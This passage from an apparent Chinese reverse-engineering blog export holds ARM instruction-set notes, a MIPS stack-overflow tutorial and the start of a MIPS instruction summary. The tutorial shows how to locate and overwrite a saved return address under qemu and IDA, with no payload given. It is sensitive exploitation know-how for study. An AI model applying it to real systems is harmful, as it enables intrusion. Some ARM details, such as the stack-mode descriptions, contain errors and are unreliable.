SPSR：每一种模式下都有一个状态寄存器SPSR，用于保存CPSR的状态，以便异常返回后恢复异常发生时的工作状态。用户模式和系统模式不是异常状态，所以没有SPSR，在这两种模式下访问SPSR，将产生不可预知的后果。 CPSR详解： ps：长度为32 cpsr包括条件标志位、中断禁止位、当前处理器模式标志以及其他的一些控制和状态位 通过上图就可以理解cpsr_cxsf的意思了 条件码标志N：结果是有符号的二进制补码情况下，结果为负的话N&#x3D;1，结果为非负的话N&#x3D;0 Z：结果如果为零的话Z&#x3D;1，结果非零的话Z&#x3D;0 C：有多种情况 对于加法指令（包括比较指令CMN），产生进位的话C&#x3D;1，否则C&#x3D;0。 对于减法指令（包括比较指令CMP），如果产生借位，则C&#x3D;0;否则C&#x3D;1。 对于有移位操作的非法指令，C为移位操作中最后移出位的值。 对于其他指令，C通常不变。 ps：比较指令CMN与CMP其实才是算数指令，之后会有详解 V：对于加减法指令，在操作数和结果是有符号的整数时，如果发生溢出，则V&#x3D;1；如果无溢出发生，则V&#x3D;0；对于其他指令，V通常不发生变化 ARM指令集指令格式 {} {S} , {,} &lt;&gt;内是必须项，&#123;&#125;内是可选项，不写代表无条件执行 opcode 指令助记符，如LDR，STR 等 cond 执行条件，如EQ，NE 等 S 是否影响CPSR 寄存器的值，书写时影响CPSR，否则不影响 Rd 目标寄存器 Rn 第一个操作数的寄存器 operand2 第二个操作数 储存器访问指令ARM 处理是加载&#x2F;存储体系结构的典型的RISC处理器 对存储器的访问只能使用加载和存储指令实现 ARM 的加载&#x2F;存储指令是可以实现字、半字、无符&#x2F;有符字节操作 批量加载&#x2F;存储指令可实现一条指令加载&#x2F;存储多个寄存器的内容 SWP指令是一条寄存器和存储器内容交换的指令，可用于信号量操作等 ARM 处理器是冯.诺依曼存储结构，程序空间、RAM 空间及IO 映射空间统一编址，除对对RAM 操作以外，对外围IO、程序数据的访问均要通过加载&#x2F;存储指令进行 下图给出ARM存储访问指令表 LDR&#x2F;STR LDR{cond}{T} Rd,&lt;地址&gt;; STR{cond}{T} Rd,&lt;地址&gt;; LDR从内存中读取数据放入寄存器，STR用于将寄存器内的数据放到内存 LDR R2, [R7,#0x10+var_C] 将R7 + 0x10+var_C地址的数据放到R2 STR R3, [R7,#0x10+var_4] 将R3的数据储存在R7 + 0x10+var_4 {T}为可选项，若指令有T，那么即使处理器是在特权模式下，存储系统也将访问看成是处理器是在用户模式下 T在用户模式下无效，不能与前索引偏移一起使用T LDR Rd,[Rn] 零偏移，将Rn的值作为内存地址 LDR Rd,[Rn,#0x04]! 前索引偏移，将Rn+0x04地址的值放到Rd，并且更新Rn的值为Rn &#x3D; Rn + 0x04，如果没有后边感叹号，则Rn不更新 LDR Rd,label ; 程序相对偏移，label 为程序标号，label 必须是在当前指令的±4KB范围内 LDR Rd,[Rn],#0x04 后索引偏移，将Rn中的地址的数据加载到Rd中，然后将Rn更新Rn &#x3D; Rn + 0x04 ps：前索引偏移就是在索引前偏移，看有无！决定时候更新寄存器的内容。后索引偏移就是在索引后偏移，索引时并不偏移，索引后更新寄存器内容 LDM&#x2F;STM LDM{cond}&lt;模式&gt; Rn{!},reglist{^} STM{cond}&lt;模式&gt; Rn{!},reglist{^} LDM 加载多个寄存器，STM储存多个寄存器 主要用途是现场保护、数据复制、参数传送等 其模式有8种，如下所列：(前面4 种用于数据块的传输，后面4 种是堆栈操作) (1) IA：每次传送后地址加4 (2) IB：每次传送前地址加4 (3) DA：每次传送后地址减4 (4) DB：每次传送前地址减4 (5) FD：满递减堆栈 (6) ED：空递增堆栈 (7) FA：满递增堆栈 (8) EA：空递增堆栈 寄存器Rn为基址寄存器，装有传送数据的初始地址，Rn 不允许为R15；缀!表示最后的地址写回到Rn中 寄存器列表reglist 可包含多于一个寄存器或寄存器范围，使用“,”分开，如{R1,R2,R6-R9}，寄存器排列由小到大排列 ^后缀不允许在用户模式呈系统模式下使用，若在LDM 指令用寄存器列表中包含有PC 时使用，那么除了正常的多寄存器传送外，将SPSR 拷贝到CPSR 中，这可用于异常处理返回 使用^后缀进行数据传送且寄存器列表不包含PC时，加载&#x2F;存储的是用户模式的寄存器，而不是当前模式的寄存器 LDMIA R0!,{R3-R9} ;加载R0 指向的地址上的多字数据，保存到R3～R9中，R0 值更新 STMIA R1!,{R3-R9} ;将R3～R9 的数据存储到R1 指向的地址上，R1值更新 STMFD SP!,{R0-R7,LR} ;现场保存，将R0～R7、LR入栈 LDMFD SP!,{R0-R7,PC}^;恢复现场，异常处理返回 SWP 寄存器和存储器交换指令 SWP{cond}{B} Rd,Rm,[Rn] SWP指令用于将一个内存单元（该单元地址放在寄存器Rn中）的内容读取到一个寄存器Rd中，同时将另一个寄存器Rm 的内容写入到该内存单元中 B 为可选后缀，若有B，则交换字节，否则交换32 位字：Rd 为数据从存储器加载到的寄存器;Rm的数据用于存储到存储器中，若Rm 与Rn 相同，则为寄存器与存储器内容进行交换;Rn 为要进行数据交换的存储器地址，Rn 不能与Rd 和Rm 相同 SWP R1,R1,[R0] ; 将R1 的内容与R0 指向的存储单元的内容进行交换 SWP R1,R2,,[R0] ; 将R0 指向的存储单元内容读取一字节数据到R1中(高24 位清零) ; 并将R2 的内容写入到该内存单元中(最低字节有效) ARM 数据处理指令MOV 数据传送指令 MOV{cond}{S} Rd,operand2 将8 位立即数或寄存器(operant2)传送到目标寄存器Rd，可用于移位运算等操作 MOV R1#0x10 ;R1&#x3D;0x10 MOV R0,R1 ;R0&#x3D;R1 MOVS R3,R1,LSL #2 ;R3&#x3D;R1＜＜2，并影响标志位 MOV PC,LR ;PC&#x3D;LR ，子程序返回 MVN 数据非传送指令 MVN{cond}{S} Rd,operand2 将8 位图立即数或寄存器(operand2)按位取反后传送到目标寄存器(Rd)，因为其具有取反功能，所以可以装载范围更广的立即数 MVN R1,#0xFF ;R1&#x3D;0xFFFFFF00 MVN R1,R2 ;将R2 取反，结果存到R1 ADD 加法运算指令 ADD{cond}{S} Rd,Rn,operand2 将operand2 数据与Rn 的值相加，结果保存到Rd 寄存器 ADDS R1,R1,#1 ;R1&#x3D;R1+1 ADD R1,R1,R2 ;R1&#x3D;R1+R2 ADDS R3,R1,R2,LSL #2 ;R3&#x3D;R1+R2＜＜2 SUB 减法运算指令 SUB{cond}{S} Rd,Rn,operand2 用寄存器Rn 减去operand2。结果保存到Rd 中 SUBS R0,R0,#1 ;R0&#x3D;R0-1 SUBS R2,R1,R2 ;R2&#x3D;R1-R2 SUB R6,R7,#0x10 ;R6&#x3D;R7-0x10 RSB 逆向减法指令 RSB{cond}{S} Rd,Rn,operand2 用寄存器operand2 减法Rn，结果保存到Rd 中 RSB R3,R1,#0xFF00 ;R3&#x3D;0xFF00-R1 RSBS R1,R2,R2,LSL #2 ;R1&#x3D;R2＜＜2-R2&#x3D;R2×3 RSB R0,R1,#0 ;R0&#x3D;-R1 ADC 带进位加法指令 ADC{cond}{S} Rd,Rn,operand2 将operand2 的数据与Rn 的值相加，再加上CPSR中的C 条件标志位，结果保存到Rd 寄存器 ADC R1,R1,R3 ;使用ADC 实现64 位加法，R1&#x3D;R1+R3 SBC 带进位减法指令 SCB{cond}{S}Rd,Rn,operand2 用寄存器Rn 减去operand2，再减去CPSR 中的C条件标志位的非（即若C 标志清零，则结果减去1），结果保存到Rd 中 SBC R1,R1,R3 ;使用SBC 实现64 位减法，R1 &#x3D; R1 - R3 RSC 带进位逆向减法指令 RSC{cond}{S} Rd,Rn,operand2 用寄存器operand2 减去Rn，再减去CPSR 中的C条件标志位，结果保存到Rd 中 RSC R3,R1,#0 ;使用RSC 指令实现求64 位数值的负数 R3 &#x3D; 0 -R1 **AND **逻辑与操作指令 AND{cond}{S} Rd,Rn,operand2 将operand2 值与寄存器Rn 的值按位作逻辑与操作，结果保存到Rd中 逻辑与操作，都为1则返回1 ANDS R0,R0,#x01 ;R0&#x3D;R0&amp;0x01，取出最低位数据 AND R2,R1,R3 ;R2&#x3D;R1&amp;R3 **ORR **逻辑或操作指令 ORR{cond}{S} Rd,Rn,operand2 将operand2 的值与寄存器Rn的值按位作逻辑或操作，结果保存到Rd 中 ORR R0,R0,#x0F ;将R0 的低4 位置1 MOV R1,R2,LSR #4 ORR R3,R1,R3,LSL #8 ;使用ORR 指令将近R2 的高8位数据移入到R3 低8 位中 **EOR **逻辑异或操作指令 EOR{cond}{S}Rd,Rn,operand2 将operand2 的值与寄存器Rn 的值按位作逻辑异或操作，结果保存到Rd中 EOR R1,R1,#0x0F ;将R1 的低4 位取反 EOR R2,R1,R0 ;R2&#x3D;R1^R0 EORS R0,R5,#0x01 ;将R5 和0x01 进行逻辑异或，结果保存到R0，并影响标志位 BIC 位清除指令 BIC{cond}{S}Rd,Rn,operand2 将寄存器Rn 的值与operand2 的值的反码按位作逻辑与操作，结果保存到Rd中。 BIC R1,R1,#0x0F ;将R1 的低4 位清零，其它位不变 BIC R1,R2,R3 ;将拭的反码和R2 相逻辑与，结果保存到R1 CMP 比较指令 CMP{cond} Rn,operand2 指令使用寄存器Rn 的值减去operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行 CMP 指令不保存运算结果 CMP R1,#10 ;R1 与10 比较，设置相关标志位 CMP R1,R2 ;R1 与R2 比较，设置相关标志位 **CMN **负数比较指令 CMN{cond} Rn,operand2 指令使用寄存器Rn 与值加上operand2 的值，根据操作的结果更新CPSR中的相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行 CMN R0,#1 ;R0+1,判断R0 是否为1 的补码，若是Z 置位 CMN 指令与ADDS 指令的区别在于CMN 指令不保存运算结果。CMN指令可用于负数比较，比如CMNR0，#1 指令则表示R0 与-1 比较，若R0 为-(即1 的补码)，则Z 置位，否则Z复位。 TST 位测试指令 TST{cond} Rn,operand2 指令将寄存器Rn 的值与operand2 的值按位作逻辑与操作，根据操作的结果更新CPSR中相应的条件标志位(当结果为0时，EQ位被设置)，以便后面指令根据相应的条件标志来判断是否执行 TST R0,#0x01 ;判断R0 的最低位是否为0 TST R1,#0x0F ;判断R1 的低4 位是否为0 TST 指令与ANDS 指令的区别在于TST4 指令不保存运算结果。TST指令通常于EQ、NE条件码配合使用，当所有测试位均为0 时，EQ 有效，而只要有一个测试为不为0，则NE 有效。 TEQ 相等测试指令 TEQ{cond} Rn,operand2 指令寄存器Rn 的值与operand2 的值按位作逻辑异或操作，根据操作的结果更新CPSR中相应条件标志位，以便后面的指令根据相应的条件标志来判断是否执行 TEQ R0,R1 ;比较R0 与R1 是否相等(不影响V 位和C 位) TST 指令与EORS 指令的区别在于TST 指令不保存运算结果。使用TEQ进行相等测试，常与EQNE 条件码配合使用，当两个数据相等时，EQ 有效，否则NE 有效。 MUL 32 位乘法指令 MUL{cond}{S} Rd,Rm,Rs 指令将Rm 和Rs 中的值相乘，结果的低32 位保存到Rd中 MUL R1,R2,R3 ;R1&#x3D;R2×R3 MULS R0,R3,R7 ;R0&#x3D;R3×R7，同时设置CPSR 中的N位和Z 位 MLA 32 位乘加指令 MLA{cond}{S} Rd,Rm,Rs,Rn 指令将Rm 和Rs 中的值相乘，再将乘积加上第3 个操作数，结果的低32位保存到Rd 中 MLA R1,R2,R3,R0 ;R1&#x3D;R2×R3+R0 **UMULL ** 64 位无符号乘法指令 UMULL{cond}{S} RdLo,RdHi,Rm,Rs 指令将Rm 和Rs 中的值作无符号数相乘，结果的低32位保存到RsLo 中，而高32 位保存到RdHi 中 UMULL R0,R1,R5,R8 ;(R1、R0)&#x3D;R5×R8 UMLAL 64 位无符号乘加指令 UMLAL{cond}{S} RdLo,RdHi,Rm,Rs 指令将Rm 和Rs 中的值作无符号数相乘，64 位乘积与RdHi、RdLo相加，结果的低32 位保存到RdLo 中，而高32 位保存到RdHi 中 UMLAL R0,R1,R5,R8;(R1,R0)&#x3D;R5×R8+(R1,R0) **SMULL **64 位有符号乘法指令 SMULL{cond}{S} RdLo,RdHi,Rm,Rs 指令将Rm 和Rs 中的值作有符号数相乘，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中 SMULL R2,R3,R7,R6 ;(R3,R2)&#x3D;R7×R6 SMLAL 64 位有符号乘加指令 SMLAL{cond}{S} RdLo,RdHi,Rm,Rs 指令将Rm 和Rs 中的值作有符号数相乘，64 位乘积与RdHi、RdLo，相加，结果的低32位保存到RdLo 中，而高32 位保存到RdHi 中 SMLAL R2,R3,R7,R6;(R3,R2)&#x3D;R7×R6+(R3,R2) ARM跳转指令B B{cond} label 跳转到指定的地址执行程序，跳转到指令B 限制在当前指令的±32Mb 的范围内 B WAITA ;跳转到WAITA 标号处 B 0x1234 ;跳转到绝对地址0x1234 处 **BL **带链接的跳转指令 BL{cond} label 指令将下一条指令的地址拷贝到R14(即LR)链接寄存器中，然后跳转到指定地址运行程序 跳转指令B 限制在当前指令的±32MB 的范围内。BL 指令用于子程序调用 BL DELAY BX 带状态切换的跳转指令 BX{cond} Rm 跳转到Rm 指定的地址执行程序，若Rm 的位[0]为1，则跳转时自动将CPSR 中的标志T 置位，即把目标地址的代码解释为Thumb代码;若Rm 的位[0]为0，则跳转时自动将CPSR 中的标志T 复位，即把目标地址的代码解释为ARM代码 ADRL R0,ThumbFun+1 BX R0 ;跳转到R0 指定的地址，并根据R0 的最低位来切换处理器状态 BLXBLX目标地址：跳转，改变状态及保存PC值 ARM 协处理器指令CDP 协处理器数据操作指令 CDP{cond}coproc,opcodel,CRd,CRn,CRm{,opcode2} coproc 指令操作的协处理器名。标准名为pn,n 为0～15。 opcodel 协处理器的特定操作码。 CRd 作为目标寄存器的协处理器寄存器。 CRN 存放第1 个操作数的协处理器寄存器。 CRm 存放第2 个操作数的协处理器寄存器。 Opcode2 可选的协处理器特定操作码。 ARM 处理器通过CDP 指令通知ARM 协处理器执行特定的操作。该操作由协处理器完成，即对命令的参数的解释与协处理器有关，指令的使用取决于协处理器。若协处理器不能成功地执行该操作，将产生未定义指令异常中断 CDP p7,0,c0,c2,c3,0 ;协处理器7 操作，操作码为0，可选操作码为0 CDP p6,1,c3,c4,c5 ;协处理器操作，操作码为1 LDC 协处理器数据读取指令 LDC{cond}{L} coproc,CRd,&lt;地址&gt; L 可选后缀，指明是长整数传送。 coproc 指令操作的协处理器名。标准名为pn，n 为0～15 CRd 作为目标寄存的协处理器寄存器。 &lt;地址&gt; 指定的内存地址 LDC指令从某一连续的内存单元将数据读取到协处理器的寄存器中。协处理器数据的数据的传送，由协处理器来控传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断 LDC p5,c2,[R2,#4];读取R2+4指向的内存单元的数据，传送到协处理器p5的c2寄存器中 LDC p6,c2,[R1] ;读取是指向的内存单元的数据，传送到协处理器p6的c2 寄存器中 STC 协处理器数据写入指令 STC{cond}{L} coproc,CRd,&lt;地址&gt; L 可选后缀，指明是长整数传送。 coproc 指令操作的协处理器名。标准名为pn，n 为0～15 CRd 作为目标寄存的协处理器寄存器。 &lt;地址&gt; 指定的内存地址 STC指令将协处理器的寄存器数据写入到某一连续的内存单元中。进行协处理器数据的数据传送，由协处理器来控制传送的字数。若协处理器不能成功地执行该操作，将产生未定义指令异常中断 STC p5,c1,[R0] STC p5,c1,[Ro,#-0x04] MCR ARM寄存器到协处理器寄存器的数据传送指令 MCR{cond}coproc,opcodel,Rd,CRn,CRm{,opcode2} coproc 指令操作的协处理器名。标准名为pn，n 为0～15。 cpcodel 协处理器的特定操作码。 RD 作为目标寄存器。 CRn 存放第1 个操作数的协处理器寄存器 CRm 存放第2 个操作数的协处理器寄存器。 Opcode2 可选的协处理器特定操作码。 MCR 指令将ARM 处理器的寄存器中的数据传送到协处理器的寄存器中。若协处理器不能成功地执行该操作，将产生未定义指令异常中断 MCR p6,2,R7,c1,c2, MCR P7,0,R1,c3,c2,1, MRC 协处理器寄存器到ARM寄存器到的数据传送指令 MRC {cond}coproc,opcodel,Rd,CRn,CRm{,opcode2} coproc 指令操作的协处理器名。标准名为pn，n为0～15。 opcodel 协处理器的特定操作码。 Rd 作为目标寄存器。 CRn 存放第1 个操作数的协处理器寄存器。 CRm 存放第2 个操作数的协处理器寄存器。 opcode2 可选的协处理器特定操作码。 MRC 指令将协处理器寄存器中的数据传送到ARM 处理器的寄存器中。若协处理器不能成功地执行该操作。将产生未定义异常中断 MRC p5,2,R2,c3,c2 MRC p7,0,R0,c1,c2,1 ARM 杂项指令SWI 软中断指令 SWI{cond} immed_24 immed_24 24 位立即数，值为0～16777215 之间的整数。 SWI 指令用于产生软中断，从而实现在用户模式变换到管理模式，CPSR保存到管理模式的SPSR中，执行转移到SWI 向量，在其它模式下也可使用SWI 指令，处理同样地切换到管理模式 SWI 0 ;软中断，中断立即数为0 SWI 0x123456 ;软中断，中断立即数为0x123456 使用SWI 指令时，通常使用以下两种方法进行传递参数，SWI 异常中断处理程序就可以提供相关的服务，这两种方法均是用户软件协定。SWI异常中断处理程序要通过读取引起软中断的SWI 指令，以取得24 位立即数。 （A）指令24 位的立即数指定了用户请求的服务类型，参数通过用寄存器传递。 MOV R0,#34 ;设置了功能号为34 SWI 12 ;调用12 号软中断 （B）指令中的24 位立即数被忽略，用户请求的服务类型由寄存器R0 的值决定，参数通过其它的通用寄存器传递。 MOV R0,#12 ;调用12 号软中断 MOV R1,#34 ;设置子功能号为34 SWI 0 ; 在SWI 异常中断处理程序中，取出SWI 立即数的步骤为：首先确定引起软中断的SWI指令是ARM指令还时Thumb 指令，这可通过对SPSR 访问得到：然后要取得该SWI 指令的地址，这可通过访问LR 寄存器得到：接着读出指令，分解出立即数。 读出SWI 立即数： T_bit EQU 0x20 SWI_Hander STMFD SP!,&#123;R0_R3,R12,LR&#125; ;现场保护 MRS R0,SPSR ;读取SPSR STMFD SP!,&#123;R0&#125; ;保存SPSR TST R0,#T_bit ;测试T标志位 LDRNEH R0,[LR,#-2] ;若是Thumb指令，读取指令码(16 位) BICNE R0,R0,#0xFF00 ;取得Thumb 指令的8 位立即数 LDREQ R0,[LR,#-4] ;若是ARM 指令，读取指令码(32 位) BICNQ R0,R0,#0xFF00000 ;取得ARM 指令的24 位立即数 … LDMFD SP!,&#123;R0-R3,R12,PC&#125;^ ;SWI 异常中断返回 MRS 读状态寄存器指令 MRS{cond} Rd ,psr Rd 目标寄存器。Rd 不允许为R15。 psr CPSR 或SPSR 在ARM 处理器中，只有MRS 指令可以状态寄存器CPSR或SPSR读出到通用寄存器中 MRS 指令读取CPSR，可用来判断ALU 的状态标志，或IRQ、FIQ中断是否允许等；在异常处理程序中，读SPSR 可知道进行异常前的处理器状态等。MRS 与MSR 配合使用，实现CPSR 或SPSR 寄存器的读—修改—写操作，可用来进行处理器模式切换()，允许&#x2F;禁止IRQ&#x2F;FIQ中断等设置。另外，进程切换或允许异常中断嵌套时，也需要使用MRS 指令读取SPSR 状态值。保存起来 MRS R1,CPSR ;将CPSR状态寄存器读取，保存到R1 中 MRS R2,SPSR ;将SPSR状态寄存器读取，保存到R2 中 使能IRQ 中断例程： ENABLE_IRQ MRS R0,CPSR BIC R0。R0,#0x80 MSR CPSR_c,R0 MOV PC,LR 禁能IRQ 中断例程： DISABLE_IRQ MRS R0,CPSR ORR R0,R0,#0x80 MSR CPSR_c,R0 MOV PC,LR MSR 写状态寄存器指令 MSR{cond} psr_fields,#immed_8r MSR{cond} psr_fields,Rm 其中： psr CPSR 或SPSR fields 指定传送的区域。Fields 可以是以下的一种或多种(字母必须为小写)： c 控制域屏蔽字节(psr[7…0]) x 扩展域屏蔽字节(psr[15…8]) s 状态域屏蔽字节(psr[23。…16]) f 标志域屏蔽字节(psr[31…24]) immed_8r 要传送到状态寄存器指定域的立即数，8 位。 Rm 要传送到状态寄存器指定域的数据的源寄存器。 在ARM 处理器中。只有MSR 指令可以直接设置状态寄存器CPSR或SPSR MSR CPSR_c,#0xD3 ;CPSR[7…0]&#x3D;0xD3，即切换到管理模式。 MSR CPSR_cxsf,R3 ;CPSR&#x3D;R3 只有在特权模式下才能修改状态寄存器。程序中不能通过MSR 指令直接修改CPSR 中的T 控制位来实现ARM 状态&#x2F;Thumb状态的切换，必须使用BX 指令完成处理器状态的切换(因为BX 指令属转移指令，它会打断流水线状态，实现处理器状态切换)。MRS 与MSR 配合使用，实现CPSR或SPSR 寄存器的读-修改-写操作，可用来进行处理器模式切换、允许&#x2F;禁止IRQ&#x2F;FIQ 中断等设置。 堆栈指令实始化例程： INITSTACK MOV R0,LR ;保存返回地址 ;设置管理模式堆栈 MSR CPSR_c,#0xD3 LDR SP,StackSvc ;设置中断模式堆栈 MSR CPSR_c,#0xD2 LDR SP,StackIrq ARM 伪指令ADR 小范围的地址读取伪指令 ADR{cond} register,exper register 加载的目标寄存器。 exper 地址表达式。当地址值是非字地齐时，取值范围-255～255 字节之间；当地址是字对齐时，取值范围-1020～1020字节之间。 对于基于PC 相对偏移的地址值时，给定范围是相对当前指令地址后两个字处(因为ARM7TDMI为三级流水线)。 ADR 指令将基于PC 相对偏移的地址值读取到寄存器中。在汇编编译源程序时，ADR伪指令被编译器替换成一条合适的指令。通常，编译器用一条ADD 指令或SUB 指令来实现该ADR 伪指令的功能，若不能用一条指令实现，则产生错误，编译失败 LOOP MOV R1, #0xF0 … ADR R2, LOOP ;将LOOP 的地址放入R2 ADR R3, LOOP+4 可以用ADR 加载地址，实现查表： … ADR R0,DISP_TAB ;加载转换表地址 LDRB R1,[R0,R2] ;使用R2作为参数，进行查表 … DISP_TAB DCB0Xc0,0xF9,0xA4,0xB0,0x99,0x92,0x82,0xF8,0x80,0x90 ADRL 中等范围的地址读取伪指令 ADR{cond} register,exper register 加载的目标寄存器。 expr 地址表达式。当地址值是非字对齐时，取范围-64K～64K 字节之间；当地址值是字对齐时，取值范围-256K～256K字节之间。 ADRL 指令将基于PC 相对偏移的地址值或基于寄存器相对偏移的地址值读取到寄存器中，比ADR伪指令可以读取更大范围的地址。在汇编编译源程序时，ADRL 伪指令被编译器替换成两个条合适的指令。若不能用两条指令实现ADRL 伪指令功能，则产生错误，编译失败 ADRL R0,DATA_BUF … ADRL R1 DATA_BUF+80 … DATA_BUF SPACE 100 ;定义100 字节缓冲区 可以且用ADRL 加载地址，实现程序跳转，中等范围地址的加载：… ADR LR,RETURNI ;设置返回地址 ADRL R1Thumb_Sub+1 ;取得了Thumb 子程序入口地址，且R1 的0 位置1 BX R1 ;调用Thumb子程序，并切换处理器状态 RETURNI … CODE16 Thumb_Sub MOV R1,#10 … LDR 大范围的地址读取伪指令 LDR{cond} register,&#x3D;expr&#x2F;label_expr register 加载的目标寄存器 expr 32 位立即数。 label_expr 基于PC 的地址表达式或外部表达式。 LDR 伪指令用于加载32 位的立即数或一个地址值到指定寄存器。在汇编编译源程序时，LDR伪指令被编译器替换成一条合适的指令。若加载的常数未超出MOV 或MVN 的范围，则使用MOV 或MVN 指令代替该LDR 伪指令，否则汇编器将常量放入字池，并使用一条程序相对偏移的LDR指令从文字池读出常量 LDR R0,&#x3D;0x123456 ;加载32 位立即数0x12345678 LDR R0,&#x3D;DATA_BUF+60 ;加载DATA_BUF 地址+60 … LTORG ;声明文字池 伪指令LDR 常用于加载芯片外围功能部件的寄存器地址(32 位立即数)，以实现各种控制操作加载32位立即数： … LDR R0,&#x3D;IOPIN ;加载GPIO 寄存器IOPIN 的地址 LDR R1,[R0] ;读取IOPIN 寄存器的值 … LDR R0,&#x3D;IOSET LDR R1,&#x3D;0x00500500 STR R1,[R0] ;IOSET&#x3D;0x00500500 … 从PC 到文字池的偏移量必须小于4KB。与ARM 指令的LDR 相比，伪指令的LDR的参数有“&#x3D;”号 NOP 空操作伪指令NOP 伪指令在汇编时将会被代替成ARM 中的空操作，比如可能为“MOV R0, R0”指令等 使用就单NOP ARM寻址立即数寻址立即数前面有“#”号，并且如果是十六进制数则在“#”后添加“0x”或“&amp;”，二进制数“#”后面加“%” 寄存器间接寻址操作数的地址在寄存器中 ADD R0，R1，[R2] 基址变址寻址将寄存器的内容与指令中给出的地址偏移量相加，从而得到一个操作数的有效地址 ADD R0，R1，[R2] 多寄存器寻址一条指令可以完成多个寄存器值得传递，一条指令传送最多16个通用寄存器的值 LDMIA R0，{R1，R2，R3，R4} 相对寻址以程序计数器PC的值作为基地址，指令中的地址标号作为偏移量，将两者相加后得到的操作数的有效地址 例如：BL NEXT ARM堆栈的增长方式当堆栈指针指向最后压入堆栈的数据时，称为满堆栈(FullStack) 当堆栈指针指向最后压入堆栈的数据时，称为满堆栈(FullStack) 递增堆栈：向高地址方向生长 递减堆栈：向低地址方向生长","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"MIPS栈溢出原理","slug":"逆/mipsStackOverFlow","date":"2021-08-11T16:00:00.000Z","updated":"2022-07-20T09:57:32.000Z","comments":true,"path":"article/bd2e4070.html","link":"","permalink":"http://example.com/article/bd2e4070.html","excerpt":"","text":"MIPS的函数调用小知识： Mips 调用函数时不会将返回地址放入栈中，而在非叶子函数中，为了调用下一个函数，会将上一个函数的返回地址压栈 叶子函数，即该函数中不会调用任何其他函数 非叶子函数，即该函数需要调用其他函数 mips的函数调用过程 当函数A执行到调用函数B的指令时，函数调用指令复制当前pc寄存器的值到ra寄存器中，即ra中存放返回地址 他这个没有专门的控制ra的指令，在ja指令执行的时候，给ra赋值了 程序跳转到函数B的时候，如果是非叶子函数，函数B会先把函数A的返回地址压栈（即ra寄存器的值压栈），叶子函数没有这个操作，返回地址就只存在于ra寄存器中 main函数一般是一个非叶子函数，我们几乎可以在任何mian开头看到 sw $ra,0x20+var_s4($sp)这条指令 函数B执行完之后，叶子函数直接使用jr $ra指令返回函数A，而非叶子函数则需要，从堆栈中取出返回地址，然后将返回地址放入ra寄存器，再使用jr $ra指令 下面是两个程序（叶子和非叶子）的分析叶子函数 这个程序中，add函数为叶子函数，我们去分析add函数调用之前做了什么。 这里使用mipsel-linux-gnu-gcc -o tree tree.c -static进行编译 然后使用qemu-mipsel -g 1234 tree与ida连用的动态调试 IDA remote另一篇文章会详细讲，这里就不赘述 下断点到main函数，能看到在400578处有看到将ra压栈的操作，这个就是操作系统的某个地址。 重点在0040059c这个行，调用add函数，先不关心参数调用，只看ra寄存器的相关操作 执行完00400578后，寄存器以及栈中的内容 继续执行至0040059c，此时ra值没有改变 执行jal add 跳转过来之后，ra的值变了，值正好是jr add的下一条可用指令（nop的目的只是为了对齐） 再看add的所有指令，会发现，只有跳回main函数指令出现了ra寄存器 非叶子函数 add中调用了printf()函数。 执行进入add函数，与叶子函数相同 进入之后，抬高堆栈后，执行了ra压栈操作，即00400544这一行的操作 上图是函数执行完之后，准备返回main，在0040059c这行把main函数的返回地址放回ra。 然后通过jr $ra返回main。 参数mips函数调用传递参数规则，前四个参数通过$a1- $a3寄存器传递，其他参数通过栈传递。 从main函数中来看，先将参数数字放到临时栈中（蓝色框中），然后将第五个参数去取出，放入add的栈中，然后将前四个栈放到a0-a3寄存器中（红框） 我们来尝试画出其栈图，下图是main函数的栈图 红框为上个函数的返回地址，蓝框为局部变量，绿的是第五个参数。 栈溢出我们使用下面代码来做实验 代码大意就是从passwd这个文件读取文件。 尝试使用大量字符串 运行发现报错 栈溢出的目的是覆盖返回地址，上面说过，main一般是一个典型的非叶子函数，而且passwd文件的读取是在main中执行的， 所以我们目标应该在main刚进来的ra位置，使用ida+qemuGdb调试。 运行至main 并且关注ra的值存放的位置，右键 -&gt; jump a new window 执行完ra压栈之后，栈中的数据 下面让程序读完passwd文件，这个地方有个小方法，读取一般是在循环中一个字符一个字符读的，所以向下单步执行，如果遇到多次循环，就可以尝试吧断点下载循环执行完的下一行。 上图发现循环，尝试在循环外下断，不要断在nop上，情况允许就尽量断在nop下一行 ida下使用f9可以继续运行，直到下一个断点，运行到00400500后可以看到，地址存放的地方已经被覆盖 接下来可以使用cyclic等工具来计算长度，编写poc或exp利用。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}],"tags":[],"keywords":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/categories/%E9%80%86%E5%90%91/"}]},{"title":"MIPS指令集","slug":"逆/mips","date":"2021-08-09T16:00:00.000Z","updated":"2022-09-21T02:57:25.000Z","comments":true,"path":"article/6a1d16f9.html","link":"","permalink":"http://example.com/article/6a1d16f9.html","excerpt":"","text":"MIPS指令集mips （risc 精简指令集） 寄存器mips 有32个寄存器，编号是从$0到$31 没有强制规则，但约定用法还是引入了一堆约定名 尽量使用约定名或者叫助记符 下面是寄存器用法（截的scdn [En Takahashi]老哥的），这些东西不一定要记，尽量还是用到多查，时间久了也就记住了 比较特殊的是 $0号寄存器，他里边放的只有0，又叫0号寄存器 $31号寄存器，里边放的是函数调用指令的返回地址 $1号寄存器，又叫at，由编译器生成的复合指令使用 d v0,v1不够用的话用内存 hi和lo是两个跟乘法相关的寄存器，不是通用寄存器，所以不能用在其他地方 寻址寻址方式为地址 &#x3D; 基地址+偏移 数据类型c中 long int short char mips dword word halfword byte 长度 8 4 2 1 指令mips所有指令都是32位的 mips指令分为三种格式 R-format 其他所有的 I-format 有立即数的指令 J-format 无条件跳转 R-format对非立即数和跳转的操作 例如：add $8, $17, $18 &#x3D;》 $18 &#x3D; $8+$17 I-format数据放到寄存器，或者放入地址 分支（判断）指令 立即数运算 J-format跳转，类似于jump 常用汇编指令上边指令分类其实只是一个理解，详细的看下边 lb &#x2F; lh &#x2F; lw : 从存储器中读取一个byte&#x2F;half word&#x2F;word的数据到寄存器中 sb &#x2F; sh &#x2F;sw: 把一个byte&#x2F;half word&#x2F;word的数据从寄存器存储到存储器中 mov &#x2F; movz 